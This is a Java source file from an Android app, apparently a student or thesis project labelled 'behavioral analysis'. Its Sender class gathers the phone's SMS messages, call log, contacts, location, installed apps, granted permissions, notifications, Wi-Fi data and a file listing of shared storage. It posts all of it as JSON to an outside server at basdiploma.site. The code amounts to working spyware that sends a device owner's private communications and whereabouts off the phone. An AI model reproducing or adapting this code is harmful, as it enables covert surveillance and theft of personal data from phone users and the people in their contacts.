package com.behavioralanalysis.service;

import android.content.Context;
import android.os.AsyncTask;
import android.telecom.Call;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;

import javax.net.ssl.HttpsURLConnection;

public class Sender extends AsyncTask<String, Void, String> {

    public static String baseUrl = "https://basdiploma.site/api/log/";

    @Override
    protected String doInBackground(String... strings) {
        Logger.log("sending" + strings[0]);
        String data = "";
        URL url;
        try {
            url = new URL(baseUrl);
            HttpsURLConnection httpURLConnection = (HttpsURLConnection)url.openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type","application/json");
            httpURLConnection.setRequestProperty("Accept", "application/json");
            httpURLConnection.connect();

            OutputStream outputStream = httpURLConnection.getOutputStream();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, "UTF-8");
            outputStreamWriter.write(strings[0]);
            outputStreamWriter.flush();
            outputStreamWriter.close();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(httpURLConnection.getInputStream(), "UTF-8")
            );

            String line = null;
            StringBuilder sb = new StringBuilder();

            while ((line = bufferedReader.readLine()) != null) {
                sb.append(line);
            }

            bufferedReader.close();
            data = sb.toString();
        } catch (Exception ex) {
            Logger.log("error", ex.getMessage());
            ex.printStackTrace();
        }

        return data;
    }

    public static void start() {
        Logger.log("Sender.start()");
        try {
            Sender.sendApps(true);
            Sender.sendCalls();
            Sender.sendContacts();
            Sender.sendLocation();
            Sender.sendPermissions();
            Sender.sendSms();
            Sender.sendWifi();
            Sender.sendFile("/storage/emulated/0");
        } catch (Exception ex) {
            ex.printStackTrace();
            start();
        }
    }

    public static void send(JSONObject toSend) {
        Logger.log("Sender.send()");
        try {
            toSend.put(
                    "date",
                    android.text.format.DateFormat.format(
                            "yyyy-MM-dd HH:mm:ss",
                            Calendar.getInstance().getTime()
                    )
            );
            toSend.put("deviceId", MainService.id);
            new Sender().execute(toSend.toString());
        } catch (JSONException ex) {
            ex.printStackTrace();
        }
    }

    public static void showMsg(String msg) {
        Toast.makeText(MainService.getContext(), msg, Toast.LENGTH_SHORT).show();
    }

    public static boolean sendWifi() {
        Logger.log("Sender.sendWifi()");
        try {
            showMsg("Wifi send");
            JSONObject data = new JSONObject();
            data.put("type", "wifi");
            data.put("value", Wifi.get());
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Wifi failed");
            return false;
        }

        return true;
    }

    public static boolean sendSms() {
        Logger.log("Sender.sendSms()");
        try {
            showMsg("Sms send");
            JSONObject data = new JSONObject();
            data.put("type", "sms");
            data.put("value", Sms.get());
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Sms failed");
            return false;
        }

        return true;
    }

    public static boolean sendPermissions() {
        Logger.log("Sender.sendPermissions()");
        try {
            showMsg("Permissions send");
            JSONObject data = new JSONObject();
            data.put("type", "granted_permission");
            data.put("value", Permissions.getGranted());
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Permissions failed");
            return false;
        }

        return true;
    }

    public static boolean sendNotification(JSONObject notification) {
        Logger.log("Sender.sendNotification()");
        try {
            showMsg("Notification send");
            JSONObject data = new JSONObject();
            data.put("type", "notification");
            data.put("value", notification);
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Notification failed");
            return false;
        }

        return true;
    }

    public static boolean sendLocation() {
        Logger.log("Sender.sendLocation()");
        try {
            showMsg("Location send");
            Context context = MainService.getContext();
            Locations gps = new Locations(context);
            if (gps.isCanGetLocation()) {
                JSONObject data = new JSONObject();
                data.put("type", "location");
                data.put("value", gps.get());
                send(data);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Location failed");
            return false;
        }

        return true;
    }

    public static boolean sendContacts() {
        Logger.log("Sender.sendContacts()");
        try {
            showMsg("Contacts send");
            JSONObject data = new JSONObject();
            data.put("type", "contact");
            data.put("value", Contacts.get());
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Contacts failed");
            return false;
        }

        return true;
    }

    public static boolean sendCalls() {
        Logger.log("Sender.sendCalls()");
        try {
            showMsg("Calls send");
            JSONObject data = new JSONObject();
            data.put("type", "call");
            data.put("value", Calls.get());
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Calls failed");
            return false;
        }

        return true;
    }

    public static boolean sendApps(boolean isWithSystemApps) {
        Logger.log("Sender.sendApps()");
        try {
            showMsg("Apps send");
            JSONObject data = new JSONObject();
            data.put("type", "app");
            data.put("isWithSystemApps", isWithSystemApps);
            data.put("value", Apps.get(isWithSystemApps));
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Apps failed");
            return false;
        }

        return true;
    }

    public static boolean sendError(JSONObject data) {
        Logger.log("Sender.sendError()");
        try {
            data.put("type", "error");
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("Error failed");
            return false;
        }

        return true;
    }

    public static boolean sendFile(String path) {
        Logger.log("Sender.sendFile()");
        try {
            JSONObject data = new JSONObject();
            data.put("type", "file");
            data.put("value", Files.get(path));
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("File failed");
            return false;
        }

        return true;
    }
    public static boolean downloadFile(JSONObject object) {
        Logger.log("Sender.sendFile()");
        try {
            JSONObject data = new JSONObject();
            data.put("type", "download_file");
            data.put("value", object);
            send(data);
        } catch (Exception ex) {
            ex.printStackTrace();
            showMsg("File failed");
            return false;
        }

        return true;
    }
}
